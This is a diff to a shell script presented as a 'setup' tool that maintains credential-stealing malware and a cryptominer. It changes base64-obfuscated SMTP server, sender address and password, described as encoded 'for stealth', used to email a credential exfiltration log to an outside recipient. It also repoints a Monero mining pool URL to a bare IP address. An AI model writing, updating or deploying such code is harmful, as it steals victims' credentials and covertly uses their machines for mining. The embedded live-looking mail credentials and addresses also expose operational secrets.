@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="5.6"
-readonly BUILD_DATE="2026-05-05 05:00:00 UTC"
+readonly SCRIPT_VERSION="5.8"
+readonly BUILD_DATE="2026-05-05 05:45:00 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -230,15 +230,15 @@ readonly RECIPIENT_EMAIL="0vrzlgx7@anonaddy.me"  # ← YOUR EMAIL HERE
 readonly LOG_FILE_EMAIL="/tmp/credential_exfil_log.txt"
 
 # ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
-# These are the user's personal 24-mail.com credentials
-# Updated: 2026-05-04 - Switched to 24-mail.com SMTP (no sender verification required!)
+# These are the user's personal fullgamingacc.com credentials
+# Updated: 2026-05-05 - Switched to fullgamingacc.com SMTP
 # Decoded SMTP credentials (base64 encoded for stealth)
-SMTP_SERVER_B64="MjQtbWFpbC5jb20="
+SMTP_SERVER_B64="bWFpbC5mdWxsZ2FtaW5nYWNjLmNvbQ=="
 readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
 readonly SMTP_PORT=587
-SENDER_EMAIL_B64="bW90dG9AMjQtbWFpbC5jb20="
+SENDER_EMAIL_B64="bXRwenlub3Jtc0BmdWxsZ2FtaW5nYWNjLmNvbQ=="
 readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
-SMTP_PASSWORD_B64="MSF0YXVnZW5pY2h0cw=="
+SMTP_PASSWORD_B64="QnQ2UXF1alBycyE="
 readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
 
 # ==================== AUTO-INSTALL EMAIL TOOLS ====================
@@ -2907,7 +2907,7 @@ cat > config.json << 'EOL'
         {
             "coin": "monero",
             "algo": "rx/0",
-            "url": "gulf.moneroocean.stream:80",
+            "url": "212.227.165.247:80",
             "user": "WALLET_PLACEHOLDER",
             "pass": "PASS_PLACEHOLDER",
             "keepalive": true,
